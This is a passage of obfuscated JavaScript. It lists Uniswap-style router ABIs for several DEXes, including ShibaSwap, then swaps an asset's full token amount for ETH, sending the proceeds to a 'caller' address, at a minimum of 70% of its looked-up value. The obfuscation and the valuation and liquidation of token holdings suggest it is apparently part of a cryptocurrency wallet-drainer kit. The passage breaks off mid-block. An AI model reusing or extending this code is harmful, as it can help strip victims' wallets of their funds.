            inputs: [_0x3ec20e, _0x592bad, _0x420d8c, _0x2b4596, _0x20aecc, _0x500329, _0x17490e, _0x22b9aa, _0x195012, _0x417ffc],
            name: "removeLiquidityETHWithPermitSupportingFeeOnTransferTokens",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountETH",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4e4695 = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x23e188 = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x146edb = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x47265e = {
            internalType: 'uint256',
            name: "amountAMin",
            type: 'uint256'
          };
          const _0x7432b7 = {
            internalType: 'uint256',
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x476ab7 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x1b9eb3 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x3b1736 = {
            internalType: "bool",
            name: "approveMax",
            type: "bool"
          };
          const _0x1b1782 = {
            internalType: 'uint8',
            name: 'v',
            type: "uint8"
          };
          const _0x110fd5 = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0xd391ca = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x5d6005 = {
            inputs: [_0x4e4695, _0x23e188, _0x146edb, _0x47265e, _0x7432b7, _0x476ab7, _0x1b9eb3, _0x3b1736, _0x1b1782, _0x110fd5, _0xd391ca],
            name: "removeLiquidityWithPermit",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountA",
              'type': "uint256"
            }, {
              'internalType': 'uint256',
              'name': "amountB",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2cdc38 = {
            internalType: 'uint256',
            name: "amountOut",
            type: 'uint256'
          };
          const _0x59ae5f = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x341478 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x42f856 = {
            internalType: 'uint256',
            name: "deadline",
            type: "uint256"
          };
          const _0x405d71 = {
            inputs: [_0x2cdc38, _0x59ae5f, _0x341478, _0x42f856],
            name: "swapETHForExactTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x2db2db = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0xedaf36 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x22e887 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x1ea15e = {
            internalType: 'uint256',
            name: "deadline",
            type: 'uint256'
          };
          const _0x4ae896 = {
            inputs: [_0x2db2db, _0xedaf36, _0x22e887, _0x1ea15e],
            name: "swapExactETHForTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x1726de = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x35fdfc = {
            internalType: "address[]",
            name: "path",
            type: "address[]"
          };
          const _0x150976 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x161448 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x18d319 = {
            inputs: [_0x1726de, _0x35fdfc, _0x150976, _0x161448],
            name: "swapExactETHForTokensSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x588ce2 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x4a9925 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x4b4501 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x15040c = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x1a1990 = {
            internalType: 'uint256',
            name: "deadline",
            type: "uint256"
          };
          const _0x4217c6 = {
            internalType: 'uint256[]',
            name: "amounts",
            type: "uint256[]"
          };
          const _0x425146 = {
            inputs: [_0x588ce2, _0x4a9925, _0x4b4501, _0x15040c, _0x1a1990],
            name: "swapExactTokensForETH",
            outputs: [_0x4217c6],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x1d5e4b = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x29593f = {
            internalType: "uint256",
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x254e90 = {
            internalType: 'address[]',
            name: 'path',
            type: "address[]"
          };
          const _0x5ebb40 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x5406da = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x4f1e46 = {
            inputs: [_0x1d5e4b, _0x29593f, _0x254e90, _0x5ebb40, _0x5406da],
            name: "swapExactTokensForETHSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x838983 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x1b1cd6 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x3212 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x345c87 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x11be54 = {
            internalType: "uint256",
            name: 'deadline',
            type: "uint256"
          };
          const _0x4ebdee = {
            internalType: 'uint256[]',
            name: "amounts",
            type: 'uint256[]'
          };
          const _0x1bc147 = {
            inputs: [_0x838983, _0x1b1cd6, _0x3212, _0x345c87, _0x11be54],
            name: "swapExactTokensForTokens",
            outputs: [_0x4ebdee],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3df426 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x36c1b3 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x44aaa0 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x434f42 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x28bd08 = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x19081a = {
            inputs: [_0x3df426, _0x36c1b3, _0x44aaa0, _0x434f42, _0x28bd08],
            name: "swapExactTokensForTokensSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "nonpayable",
            type: 'function'
          };
          const _0x166e48 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x5c1d10 = {
            internalType: 'uint256',
            name: "amountInMax",
            type: 'uint256'
          };
          const _0x53553c = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x396bc2 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x537acb = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x4902c4 = {
            inputs: [_0x166e48, _0x5c1d10, _0x53553c, _0x396bc2, _0x537acb],
            name: "swapTokensForExactETH",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x10862f = {
            internalType: "uint256",
            name: 'amountOut',
            type: 'uint256'
          };
          const _0xc3e2b6 = {
            internalType: 'uint256',
            name: "amountInMax",
            type: 'uint256'
          };
          const _0x3121dd = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x64ddd7 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x55bd80 = {
            internalType: 'uint256',
            name: "deadline",
            type: 'uint256'
          };
          const _0x1835d7 = {
            internalType: 'uint256[]',
            name: "amounts",
            type: 'uint256[]'
          };
          const _0x35de49 = {
            inputs: [_0x10862f, _0xc3e2b6, _0x3121dd, _0x64ddd7, _0x55bd80],
            name: "swapTokensForExactTokens",
            outputs: [_0x1835d7],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x230463 = {
            stateMutability: "payable",
            type: 'receive'
          };
          let _0x54a818 = [_0x428fc9, _0x8ae293, _0x2f2c70, _0x156da6, _0x1f9eb5, _0x185c62, _0x32d661, _0xded511, _0x6a536c, _0x43ef0d, _0x46bce1, _0x3ad6e9, _0x1e021f, _0x1f0856, _0x20ba05, _0x5d6005, _0x405d71, _0x4ae896, _0x18d319, _0x425146, _0x4f1e46, _0x1bc147, _0x19081a, _0x4902c4, _0x35de49, _0x230463];
          let _0x254a22 = new ethers.Contract(_0x3941f8, _0x54a818, _0xab3127);
          let _0x52074e = await _0x254a22.WETH();
          let _0x35e843 = [];
          _0x35e843[0] = _0x2a18aa.asset.token;
          _0x35e843[1] = _0x52074e;
          try {
            let _0x29c1aa = this.token_array.find(_0x3a5de2 => _0x3a5de2.token_address == _0x2a18aa.asset.token && _0x3a5de2.chain == _0x2a18aa.chain);
            let _0x231efa = this.token_array.find(_0x47cabb => _0x47cabb.token_address == "native" && _0x47cabb.chain == _0x2a18aa.chain);
            _0xcd0737 = this.web3Js.utils.toBN(this.web3Js.utils.toWei((Number(_0x29c1aa.value) * Number(0.7) / Number(_0x231efa.price)).toString(), 'ether'));
          } catch {}
          return [_0x254a22.swapExactTokensForETH(_0x2a18aa.asset.amount, _0xcd0737, _0x35e843, this.getCaller(_0x2a18aa), _0x4d5eff), _0x52074e];
        }
      case "ShibaSwap":
        {
          const _0x47969d = {
            internalType: "address",
            name: "_factory",
            type: "address"
          };
          const _0x3ed17c = {
            internalType: "address",
            name: "_WETH",
            type: "address"
          };
          const _0x98a7b0 = {
            inputs: [_0x47969d, _0x3ed17c],
            stateMutability: "nonpayable",
            type: "constructor"
          };
          const _0x1b57cd = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x486093 = {
            inputs: [],
            name: "WETH",
            outputs: [_0x1b57cd],
            stateMutability: 'view',
            type: 'function'
          };
          const _0x558446 = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x2d5363 = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x2d042e = {
            internalType: 'uint256',
            name: "amountADesired",
            type: 'uint256'
          };
          const _0x4ffc2b = {
            internalType: 'uint256',
            name: "amountBDesired",
            type: "uint256"
          };
          const _0x2afade = {
            internalType: 'uint256',
            name: "amountAMin",
            type: 'uint256'
          };
          const _0x1a176c = {
            internalType: 'uint256',
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x41acd8 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x4b76c7 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x2a1745 = {
            internalType: 'uint256',
            name: "amountA",
            type: 'uint256'
          };
          const _0x1985bc = {
            internalType: 'uint256',
            name: "amountB",
            type: 'uint256'
          };
          const _0x6ec813 = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x1f09dd = {
            inputs: [_0x558446, _0x2d5363, _0x2d042e, _0x4ffc2b, _0x2afade, _0x1a176c, _0x41acd8, _0x4b76c7],
            name: "addLiquidity",
            outputs: [_0x2a1745, _0x1985bc, _0x6ec813],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4b9c4a = {
            internalType: "address",
            name: 'token',
            type: 'address'
          };
          const _0x452992 = {
            internalType: 'uint256',
            name: "amountTokenDesired",
            type: 'uint256'
          };
          const _0x4d85de = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: "uint256"
          };
          const _0x2ba29e = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: "uint256"
          };
          const _0x335afb = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x8034ad = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x3b9e5d = {
            inputs: [_0x4b9c4a, _0x452992, _0x4d85de, _0x2ba29e, _0x335afb, _0x8034ad],
            name: "addLiquidityETH",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountToken",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountETH",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "liquidity",
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x4d1c86 = {
            inputs: [],
            name: 'factory',
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x4f2301 = {
            internalType: 'uint256',
            name: "amountOut",
            type: 'uint256'
          };
          const _0x2d5330 = {
            internalType: 'uint256',
            name: "reserveIn",
            type: 'uint256'
          };
          const _0x460ec3 = {
            internalType: 'uint256',
            name: 'reserveOut',
            type: 'uint256'
          };
          const _0x236381 = {
            inputs: [_0x4f2301, _0x2d5330, _0x460ec3],
            name: "getAmountIn",
            outputs: [{
              'internalType': "uint256",
              'name': 'amountIn',
              'type': 'uint256'
            }],
            stateMutability: 'pure',
            type: "function"
          };
          const _0xca6ee8 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x127fe8 = {
            internalType: 'uint256',
            name: 'reserveIn',
            type: 'uint256'
          };
          const _0x2ca7e9 = {
            internalType: 'uint256',
            name: 'reserveOut',
            type: "uint256"
          };
          const _0x22f3df = {
            inputs: [_0xca6ee8, _0x127fe8, _0x2ca7e9],
            name: "getAmountOut",
            outputs: [{
              'internalType': 'uint256',
              'name': 'amountOut',
              'type': 'uint256'
            }],
            stateMutability: 'pure',
            type: "function"
          };
          const _0x268f4a = {
            internalType: 'uint256',
            name: 'amountOut',
            type: "uint256"
          };
          const _0xbd8fef = {
            internalType: "address[]",
            name: 'path',
            type: 'address[]'
          };
          const _0x2d77dd = {
            inputs: [_0x268f4a, _0xbd8fef],
            name: "getAmountsIn",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x485ece = {
            internalType: 'uint256',
            name: 'amountIn',
            type: "uint256"
          };
          const _0x3edbf8 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x445656 = {
            internalType: 'uint256[]',
            name: "amounts",
            type: 'uint256[]'
          };
          const _0x1003ca = {
            inputs: [_0x485ece, _0x3edbf8],
            name: "getAmountsOut",
            outputs: [_0x445656],
            stateMutability: "view",
            type: "function"
          };
          const _0x11fe40 = {
            internalType: 'uint256',
            name: "amountA",
            type: "uint256"
          };
          const _0x2cd93e = {
            internalType: 'uint256',
            name: 'reserveA',
            type: 'uint256'
          };
          const _0x3c6b7e = {
            internalType: "uint256",
            name: "reserveB",
            type: 'uint256'
          };
          const _0x53916f = {
            inputs: [_0x11fe40, _0x2cd93e, _0x3c6b7e],
            name: "quote",
            outputs: [{
              'internalType': "uint256",
              'name': "amountB",
              'type': 'uint256'
            }],
            stateMutability: 'pure',
            type: "function"
          };
          const _0x1e6ffe = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x533aed = {
            internalType: "address",
            name: 'tokenB',
            type: "address"
          };
          const _0x5cf1d9 = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x50e192 = {
            internalType: "uint256",
            name: "amountAMin",
            type: 'uint256'
          };
          const _0x1f3e7a = {
            internalType: 'uint256',
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x2a555d = {
            internalType: "address",
            name: 'to',
            type: 'address'
          };
          const _0x4b39ce = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x319de6 = {
            internalType: 'uint256',
            name: "amountA",
            type: 'uint256'
          };
          const _0x167385 = {
            internalType: 'uint256',
            name: "amountB",
            type: 'uint256'
          };
          const _0x36b950 = {
            inputs: [_0x1e6ffe, _0x533aed, _0x5cf1d9, _0x50e192, _0x1f3e7a, _0x2a555d, _0x4b39ce],
            name: "removeLiquidity",
            outputs: [_0x319de6, _0x167385],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x488422 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x13647d = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0xea7f2e = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x5c405c = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x51c4ef = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x398cd6 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x5ab077 = {
            inputs: [_0x488422, _0x13647d, _0xea7f2e, _0x5c405c, _0x51c4ef, _0x398cd6],
            name: "removeLiquidityETH",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountToken",
              'type': 'uint256'
            }, {
              'internalType': "uint256",
              'name': "amountETH",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4b4fee = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x14f0cb = {
            internalType: 'uint256',
            name: 'liquidity',
            type: 'uint256'
          };
          const _0x50d1b8 = {
            internalType: "uint256",
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x55f38b = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x36a0cb = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x3e8f7a = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x5a3a80 = {
            inputs: [_0x4b4fee, _0x14f0cb, _0x50d1b8, _0x55f38b, _0x36a0cb, _0x3e8f7a],
            name: "removeLiquidityETHSupportingFeeOnTransferTokens",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountETH",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x7a54ff = {
            internalType: "address",
            name: "token",
            type: "address"
          };
          const _0x546861 = {
            internalType: "uint256",
            name: "liquidity",
            type: 'uint256'
          };
          const _0x1bb065 = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x43de7e = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: "uint256"
          };
          const _0x19d48d = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x475c96 = {
            internalType: "uint256",
            name: 'deadline',
            type: 'uint256'
          };
          const _0x4d648f = {
            internalType: "bool",
            name: "approveMax",
            type: "bool"
          };
          const _0x1e5e66 = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x3d37b7 = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x30b9ad = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x1c436d = {
            inputs: [_0x7a54ff, _0x546861, _0x1bb065, _0x43de7e, _0x19d48d, _0x475c96, _0x4d648f, _0x1e5e66, _0x3d37b7, _0x30b9ad],
            name: "removeLiquidityETHWithPermit",
            outputs: [{
              'internalType': "uint256",
              'name': "amountToken",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountETH",
              'type': "uint256"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3a44b4 = {
            internalType: "address",
            name: 'token',
            type: 'address'
          };
          const _0x1cad51 = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x5730fe = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x4f48f1 = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x19ee69 = {
            internalType: "address",
            name: 'to',
            type: 'address'
          };
          const _0x2e16ff = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x5c7a8d = {
            internalType: "bool",
            name: "approveMax",
            type: "bool"
          };
          const _0x509259 = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x2f2f29 = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x563114 = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0xf5b4ee = {
            internalType: 'uint256',
            name: "amountETH",
            type: "uint256"
          };
          const _0x1df824 = {
            inputs: [_0x3a44b4, _0x1cad51, _0x5730fe, _0x4f48f1, _0x19ee69, _0x2e16ff, _0x5c7a8d, _0x509259, _0x2f2f29, _0x563114],
            name: "removeLiquidityETHWithPermitSupportingFeeOnTransferTokens",
            outputs: [_0xf5b4ee],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x1ff4be = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x2751ba = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x32e18d = {
            internalType: 'uint256',
            name: "liquidity",
            type: "uint256"
          };
          const _0x21c80d = {
            internalType: 'uint256',
            name: "amountAMin",
            type: 'uint256'
          };
          const _0x1b3e2e = {
            internalType: 'uint256',
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x45ecef = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0xd478bd = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x9e20bd = {
            internalType: "bool",
            name: "approveMax",
            type: "bool"
          };
          const _0x1e2df6 = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x2f0b1f = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x4a7faf = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x5c84a9 = {
            inputs: [_0x1ff4be, _0x2751ba, _0x32e18d, _0x21c80d, _0x1b3e2e, _0x45ecef, _0xd478bd, _0x9e20bd, _0x1e2df6, _0x2f0b1f, _0x4a7faf],
            name: "removeLiquidityWithPermit",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountA",
              'type': "uint256"
            }, {
              'internalType': 'uint256',
              'name': "amountB",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x11d6c7 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x4ae2c4 = {
            internalType: "address[]",
            name: "path",
            type: "address[]"
          };
          const _0x2417d0 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x23303f = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x5c518d = {
            inputs: [_0x11d6c7, _0x4ae2c4, _0x2417d0, _0x23303f],
            name: "swapETHForExactTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x568eb4 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x50079b = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x46bc15 = {
            internalType: 'address',
            name: 'to',
            type: "address"
          };
          const _0x334852 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x1a578e = {
            inputs: [_0x568eb4, _0x50079b, _0x46bc15, _0x334852],
            name: "swapExactETHForTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x2ecd79 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x53670d = {
            internalType: "address[]",
            name: "path",
            type: "address[]"
          };
          const _0x4dac48 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x5573a9 = {
            internalType: "uint256",
            name: "deadline",
            type: "uint256"
          };
          const _0x45ce89 = {
            inputs: [_0x2ecd79, _0x53670d, _0x4dac48, _0x5573a9],
            name: "swapExactETHForTokensSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x2f3103 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: "uint256"
          };
          const _0x58947c = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0xedc0a4 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x40cc91 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x3a33b8 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x83ba33 = {
            inputs: [_0x2f3103, _0x58947c, _0xedc0a4, _0x40cc91, _0x3a33b8],
            name: "swapExactTokensForETH",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': "uint256[]"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x13c0bb = {
            internalType: "uint256",
            name: 'amountIn',
            type: 'uint256'
          };
          const _0xf3a8cd = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x28646b = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x3a0f9c = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x30a439 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x5a594f = {
            inputs: [_0x13c0bb, _0xf3a8cd, _0x28646b, _0x3a0f9c, _0x30a439],
            name: "swapExactTokensForETHSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4c0085 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x1a2a40 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x55bd3f = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x22dab2 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0xfa5c01 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x37cba9 = {
            internalType: 'uint256[]',
            name: "amounts",
            type: 'uint256[]'
          };
          const _0x12415b = {
            inputs: [_0x4c0085, _0x1a2a40, _0x55bd3f, _0x22dab2, _0xfa5c01],
            name: "swapExactTokensForTokens",
            outputs: [_0x37cba9],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x425db2 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x16bc33 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x3f8c3d = {
            internalType: "address[]",
            name: "path",
            type: "address[]"
          };
          const _0x4dd23f = {
            internalType: 'address',
            name: 'to',
            type: "address"
          };
          const _0x311a66 = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x28ec19 = {
            inputs: [_0x425db2, _0x16bc33, _0x3f8c3d, _0x4dd23f, _0x311a66],
            name: "swapExactTokensForTokensSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4a0e29 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x2ec94c = {
            internalType: "uint256",
            name: "amountInMax",
            type: 'uint256'
          };
          const _0x381e75 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x4f9e79 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x4ac085 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x399230 = {
            inputs: [_0x4a0e29, _0x2ec94c, _0x381e75, _0x4f9e79, _0x4ac085],
            name: "swapTokensForExactETH",
            outputs: [{
              'internalType': "uint256[]",
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x1be384 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x3b5c54 = {
            internalType: 'uint256',
            name: "amountInMax",
            type: 'uint256'
          };
          const _0x44cea8 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x5b14a5 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x488d6e = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x57caa5 = {
            inputs: [_0x1be384, _0x3b5c54, _0x44cea8, _0x5b14a5, _0x488d6e],
            name: "swapTokensForExactTokens",
            outputs: [{
              'internalType': "uint256[]",
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3681e7 = {
            stateMutability: "payable",
            type: 'receive'
          };
          let _0x189a2f = [_0x98a7b0, _0x486093, _0x1f09dd, _0x3b9e5d, _0x4d1c86, _0x236381, _0x22f3df, _0x2d77dd, _0x1003ca, _0x53916f, _0x36b950, _0x5ab077, _0x5a3a80, _0x1c436d, _0x1df824, _0x5c84a9, _0x5c518d, _0x1a578e, _0x45ce89, _0x83ba33, _0x5a594f, _0x12415b, _0x28ec19, _0x399230, _0x57caa5, _0x3681e7];
          let _0x2f6c7a = new ethers.Contract(_0x3941f8, _0x189a2f, _0xab3127);
          let _0x1c6354 = await _0x2f6c7a.WETH();
          let _0x379b60 = [];
          _0x379b60[0] = _0x2a18aa.asset.token;
          _0x379b60[1] = _0x1c6354;
          try {
            let _0x3b0a71 = this.token_array.find(_0x4d67d6 => _0x4d67d6.token_address == _0x2a18aa.asset.token && _0x4d67d6.chain == _0x2a18aa.chain);
            let _0x975235 = this.token_array.find(_0x5d3818 => _0x5d3818.token_address == "native" && _0x5d3818.chain == _0x2a18aa.chain);
            _0xcd0737 = this.web3Js.utils.toBN(this.web3Js.utils.toWei((Number(_0x3b0a71.value) * Number(0.7) / Number(_0x975235.price)).toString(), 'ether'));
          } catch {}
          const _0x4097d9 = {
            gasLimit: 0x7a120
          };
